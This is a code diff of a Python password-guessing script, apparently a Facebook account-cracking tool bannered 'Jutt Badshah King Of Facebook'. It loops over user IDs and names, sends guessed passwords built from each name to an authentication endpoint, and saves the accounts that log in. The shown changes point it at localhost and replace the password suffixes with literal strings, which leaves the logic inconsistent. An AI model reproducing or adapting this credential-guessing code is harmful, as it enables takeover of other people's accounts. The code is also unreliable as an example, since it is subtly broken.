@@ -913,14 +913,14 @@ def a_s():
 	print(' The Process has started')
 	print(47*'-')
 	print('')
-	print '\x1b[1;96m          Jutt Badshah King Of Facebook'
+	print '\x1b[1;96m       Jutt Badshah King Of Facebook'
         print(47*'-')
         print('')
         def main(arg):
             user = arg
             uid, name = user.split('|')
             try:
-                pass1 = name.lower() + pass1
+                pass1 = name.lower() + 'pass1'
                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
                 q = json.loads(data)
                 if 'loc' in q:
@@ -936,7 +936,7 @@ def a_s():
                     cp.close()
                     cps.append(uid + pass1)
                 else:
-                    pass2 = name.lower() + pass2
+                    pass2 = name.lower() + 'pass2'
                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                     q = json.loads(data)
                     if 'loc' in q:
@@ -952,7 +952,7 @@ def a_s():
                         cp.close()
                         cps.append(uid + pass2)
                     else:
-                        pass3 = name.lower() + pass3
+                        pass3 = name.lower() + 'pass3'
                         data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                         q = json.loads(data)
                         if 'loc' in q:
@@ -968,7 +968,7 @@ def a_s():
                             cp.close()
                             cps.append(uid + pass3)
                         else:
-                            pass4 = name.lower() + pass4
+                            pass4 = name.lower() + 'pass4'
                             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                             q = json.loads(data)
                             if 'loc' in q:
